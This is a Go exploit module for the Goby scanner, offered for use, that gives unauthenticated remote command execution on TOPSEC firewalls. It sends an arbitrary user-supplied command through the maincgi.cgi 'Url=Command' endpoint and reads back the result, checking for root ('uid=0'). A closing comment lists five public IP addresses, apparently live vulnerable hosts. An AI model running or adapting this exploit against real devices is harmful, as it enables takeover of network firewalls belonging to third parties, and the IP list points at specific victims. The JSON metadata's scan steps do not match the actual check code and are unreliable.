package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TOPSEC Firewall maincgi cgi RCE",
    "Description": "Hackers can directly command execution to obtain system permissions and take over the equipment, which can cause great harm",
    "Product": "TOPSEC-Firewall",
    "Homepage": "http://www.topsec.com.cn",
    "DisclosureDate": "2021-06-02",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "(app=\"TOPSEC-Firewall\" || app=\"TOPSEC-Product\")",
    "Level": "3",
    "Impact": "<p>Hackers can directly command execution to obtain system permissions and take over the equipment, which can cause great harm</p>",
    "Recommendation": "<p>1. It is forbidden to access the device on the public network</p><p>2. Upgrade equipment</p>",
    "References": [
        "http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-035732"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10199"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfgGet := httpclient.NewGetRequestConfig("/cgi/maincgi.cgi?Url=Command&Action=id&Para=id")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.VerifyTls = false
			go httpclient.DoHttpRequest(u, cfgGet)
			cfgRes := httpclient.NewGetRequestConfig("/cgi/maincgi.cgi?Url=CommandResult")
			cfgRes.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgRes.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(u, cfgRes)
			if err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "uid=0") || strings.Contains(resp.Utf8Html, "msgget2 error"))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := fmt.Sprintf("/cgi/maincgi.cgi?Url=Command&Action=id&Para=%s", cmd)
			cfgGet := httpclient.NewGetRequestConfig(uri)
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.VerifyTls = false
			go httpclient.DoHttpRequest(expResult.HostInfo, cfgGet)
			cfgRes := httpclient.NewGetRequestConfig("/cgi/maincgi.cgi?Url=CommandResult")
			cfgRes.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgRes.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgRes); err == nil {
				expResult.Success = true
				expResult.Output = resp.RawBody[:len(resp.RawBody)-4]
			}
			return expResult
		},
	))
}

//漏洞肯定是有的，如果返回的是err需要在多按几次请求，原因是先发送命令再去请求结果，这个速度要快
//否则就只能看到err
// https://59.39.144.244
// https://122.227.194.146:8080
// https://106.2.162.166
// https://218.29.96.74
// https://222.174.212.214
